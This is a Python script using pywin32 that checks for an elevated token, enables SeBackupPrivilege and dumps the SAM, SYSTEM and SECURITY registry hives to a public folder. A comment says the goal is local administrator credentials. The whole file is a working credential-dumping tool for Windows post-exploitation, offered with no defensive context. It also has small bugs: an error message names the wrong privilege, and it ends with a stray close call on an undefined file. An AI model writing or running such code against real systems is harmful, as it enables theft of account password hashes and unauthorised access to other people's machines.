import win32security
import win32api
import win32con
import win32process
import os
import sys
import winreg
import ntsecuritycon as ntc
import pywintypes


def ElevatedorNot():
    thehandle=win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
    elevated = win32security.GetTokenInformation(thehandle, win32security.TokenElevation)
    #print("is token elevated?", elevated)
    if elevated == 1:
        print("[+] elevated status: TokenIsElevated!!!")
        return True
    else:
        print("[!] token is not elevated...")
        return False

def SetBackupPrivilege():
    try:
        thehandle=win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
        id = win32security.LookupPrivilegeValue(None, "SeBackupPrivilege")
        newPrivileges = [(id, win32security.SE_PRIVILEGE_ENABLED)]
        win32security.AdjustTokenPrivileges(thehandle, False, newPrivileges)
        print("[+] successfully gained SeBackupPrivilege!!!!")
        return True
    except:
        print("[!] couldn't get seDebugPrivilege...")
        return False

def dumpreg():
    #Sam File
    samhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SAM", 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSaveKey(samhandle, "c:\\users\\public\\sam.save", None)
    win32api.RegCloseKey(samhandle)
    
    #System File
    systemhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SYSTEM", 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSaveKey(systemhandle, "c:\\users\\public\\system.save", None)
    win32api.RegCloseKey(systemhandle)
    
    
    #Security File (we dont have permissions to get this by default...but it's really only useful for domain creds and I just want local admin)
    try:
        securityhandle=win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, "SECURITY", 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSaveKey(securityhandle, "c:\\users\\public\\security.save", None)
        win32api.RegCloseKey(securityhandle)
    except:
        print("you don't have permission to grab the SECURITY file...")
    return True
if not ElevatedorNot():
    print("[!] not elevated...\n")
    exit()
if not SetBackupPrivilege():
    print("[!] could not get seBackupPrivilege...\n")
    exit()
if dumpreg():
    print("[+] Successfully dumped SAM, SYSTEM, and SECURITY files!!!\n")
    exit()
else:
    print("[!] couldn't dump registry...\n")
f.close()